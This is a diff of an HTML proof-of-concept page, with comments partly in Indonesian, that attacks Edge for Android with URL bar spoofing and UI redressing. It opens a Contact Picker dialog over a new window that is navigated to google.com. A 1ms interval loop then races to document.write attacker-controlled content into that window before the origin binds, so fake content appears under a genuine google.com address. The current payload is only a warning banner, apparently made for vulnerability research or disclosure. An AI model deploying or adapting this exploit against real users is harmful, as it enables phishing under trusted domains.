@@ -1,77 +1,97 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Edge Cross-Origin UI Redressing</title>
+    <title>PoC: URL Bar Spoofing & UI Redressing</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
     <style>
         body { 
-            font-family: sans-serif; 
-            display: flex; 
-            flex-direction: column;
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            text-align: center; 
-            background-color: #f0f0f0;
+            font-family: 'Segoe UI', Tahoma, sans-serif; 
+            display: flex; flex-direction: column;
+            justify-content: center; align-items: center; 
+            height: 100vh; margin: 0; background-color: #f8f9fa;
+        }
+        .container {
+            padding: 20px; background: white;
+            border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            max-width: 80%;
         }
         .trigger-btn { 
-            padding: 15px 30px; 
-            font-size: 1.2rem; 
-            cursor: pointer; 
-            background-color: #4285f4; 
-            color: white; 
-            border: none; 
-            border-radius: 8px;
+            padding: 15px 30px; font-size: 1.1rem; 
+            cursor: pointer; background-color: #0078d4; 
+            color: white; border: none; border-radius: 5px;
+            transition: background 0.2s;
         }
+        .trigger-btn:active { background-color: #005a9e; }
     </style>
 </head>
 <body>
 
-    <h1>Security Test Page for Edge</h1>
-    <p>Click the button below to start the PoC.</p>
-    <button class="trigger-btn" id="pocBtn">Execute PoC</button>
+    <div class="container">
+        <h1>Browser Security Lab</h1>
+        <p>Pengujian kerentanan Cross-Origin pada Edge for Android.</p>
+        <button class="trigger-btn" id="pocBtn">Jalankan PoC</button>
+    </div>
 
     <script>
         document.getElementById('pocBtn').onclick = async () => {
-            // 1. Memicu Dialog Kontak (Akan melayang di atas origin baru)
+            // 1. Trigger Contact Picker (Overlay UI)
+            // Ini akan melayang di atas jendela baru yang kita buka
             (async () => {
                 try {
-                    let contacts = await navigator.contacts.select(["name"], { multiple: false });
-                    if (contacts.length > 0) {
-                        alert("Data Leaked to Attacker: " + contacts["name"]);
-                    }
+                    await navigator.contacts.select(["name"], { multiple: false });
                 } catch (e) {
-                    console.log("Contact picker closed.");
+                    console.log("Picker closed");
                 }
             })();
 
-            // 2. Membuka target Google
-            let win = window.open("https://www.google.com", "PoC_Window");
+            // 2. Eksekusi Race Condition Spoofing
+            // Membuka jendela ke google.com
+            let target = "https://www.google.com";
+            let win = window.open(target, "PoC_Window");
 
-            // 3. Race Condition: Menimpa konten Google sebelum terikat (bind) ke origin asli
-            // Timeout sangat kecil (0-20ms) biasanya paling efektif untuk menimpa konten
-            setTimeout(() => {
+            // Konten palsu yang akan disuntikkan
+            const fakeContent = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Google</title>
+                    <meta name="viewport" content="width=device-width,initial-scale=1">
+                    <style>
+                        body { margin: 0; font-family: sans-serif; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; background: #fff; }
+                        .warning { color: #d93025; padding: 20px; border: 2px solid #d93025; border-radius: 8px; }
+                    </style>
+                </head>
+                <body>
+                    <div class="warning">
+                        <h1 style="font-size: 40px;">Security Alert</h1>
+                        <p>URL di atas menunjukkan <b>google.com</b> secara sah.</p>
+                        <p>Namun, konten ini berasal dari server penyerang.</p>
+                        <hr>
+                        <p>Dialog "Select Contacts" di atas adalah bagian dari teknik UI Redressing.</p>
+                    </div>
+                </body>
+                </html>
+            `;
+
+            // 3. The Injection Loop (The Bypass)
+            // Kita mencoba menulis ke document berkali-kali dalam micro-seconds
+            // untuk memotong proses 'binding' origin asli.
+            let count = 0;
+            let interval = setInterval(() => {
                 try {
-                    win.document.write(`
-                        <!DOCTYPE html>
-                        <html>
-                        <head><title>Google</title></head>
-                        <body style="display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:Arial;">
-                            <div style="text-align:center;">
-                                <h1 style="font-size: 3rem; color: red;">This is not Google!</h1>
-                                <p>The URL bar above says google.com, but this content is controlled by the attacker.</p>
-                                <p>Notice how the Contact Dialog is still visible over this page.</p>
-                            </div>
-                        </body>
-                        </html>
-                    `);
-                    win.document.close();
+                    if (win.location.href.includes("google.com") || count > 50) {
+                        win.document.write(fakeContent);
+                        win.document.close();
+                        clearInterval(interval);
+                    }
+                    count++;
                 } catch (e) {
-                    // Jika gagal karena proteksi browser, log ke console
-                    console.warn("Race condition blocked:", e);
+                    // Jika error Cross-Origin muncul, berarti proteksi sudah aktif
+                    // Kita berhenti mencoba.
+                    clearInterval(interval);
                 }
-            }, 10); 
+            }, 1); // Interval 1ms untuk memenangkan race condition
         };
     </script>
 </body>
